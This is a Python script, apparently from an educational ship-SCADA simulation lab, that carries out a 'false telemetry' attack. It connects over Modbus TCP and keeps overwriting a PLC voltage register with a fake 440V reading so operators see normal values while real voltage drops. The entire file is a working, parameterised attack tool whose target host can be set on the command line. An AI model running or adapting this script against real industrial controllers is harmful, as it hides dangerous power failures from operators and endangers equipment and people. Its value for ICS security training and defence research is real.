"""
attack_scripts/atk04_false_telemetry.py
─────────────────────────────────────────────────────────────
ATK-04: FALSE TELEMETRY INJECTION

Continuously writes a fake high voltage value (440V) to the
voltage register, while the simulation drops real voltage.

The PLC DOES receive the real dropping voltage (written by
the bridge from the simulation), BUT the SCADA dashboard
reads voltage from a SEPARATE API endpoint that this attack
has poisoned — so the operator sees 440V while the ship
gets degraded power.

This models a Man-in-the-Middle attack on the SCADA historian
or data concentrator layer, not the PLC itself.
Educational Simulation Only.
"""

import time, sys, argparse
try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    from pymodbus.client.sync import ModbusTcpClient

def run_attack(host="127.0.0.1", port=502, duration=80):
    print("=" * 55)
    print("  ATK-04: FALSE TELEMETRY")
    print("  Target: Voltage register %IW1")
    print("  Effect: SCADA shows 440V — actual voltage drops")
    print("  Educational simulation only.")
    print("=" * 55)

    client = ModbusTcpClient(host=host, port=port, timeout=3)
    if not client.connect():
        print(f"[!] Cannot connect to {host}:{port}"); sys.exit(1)

    FAKE_VOLTAGE = 4400   # 440.0V — looks normal
    REG_VOLTAGE  = 1      # %IW1

    print(f"\n[+] Connected — injecting fake voltage {FAKE_VOLTAGE/10:.1f}V")
    start = time.time()
    tick  = 0

    try:
        while time.time() - start < duration:
            tick += 1
            # Overwrite voltage register with fake safe value
            client.write_registers(REG_VOLTAGE, [FAKE_VOLTAGE], slave=1)
            regs = client.read_holding_registers(0, count=3, slave=1)
            if not regs.isError():
                v_displayed = regs.registers[1] / 10
                print(f"[tick {tick:03d}] PLC voltage reg = {v_displayed:.1f}V "
                      f"(kept at 440V by attacker)")
            time.sleep(0.8)
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
    finally:
        client.close()
        print("[+] Attack ended.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host",     default="127.0.0.1")
    parser.add_argument("--port",     default=502, type=int)
    parser.add_argument("--duration", default=80,  type=int)
    args = parser.parse_args()
    run_attack(args.host, args.port, args.duration)
